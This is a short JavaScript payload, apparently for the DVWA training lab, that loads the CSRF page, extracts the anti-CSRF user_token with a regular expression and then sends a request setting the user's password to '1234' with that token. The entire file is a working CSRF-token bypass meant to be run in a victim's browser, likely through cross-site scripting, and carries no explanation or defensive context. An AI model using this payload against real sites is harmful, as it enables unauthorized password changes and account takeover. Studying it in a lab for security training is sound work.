var r1 = new XMLHttpRequest();
r1.open("GET", "/vulnerabilities/csrf/", false);
r1.send();
var token = r1.responseText.match(/user_token' value='([0-9a-f]+)'/)[1];

var r2 = new XMLHttpRequest();
r2.open("GET", "/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change&user_token=" + token, false);
r2.send();
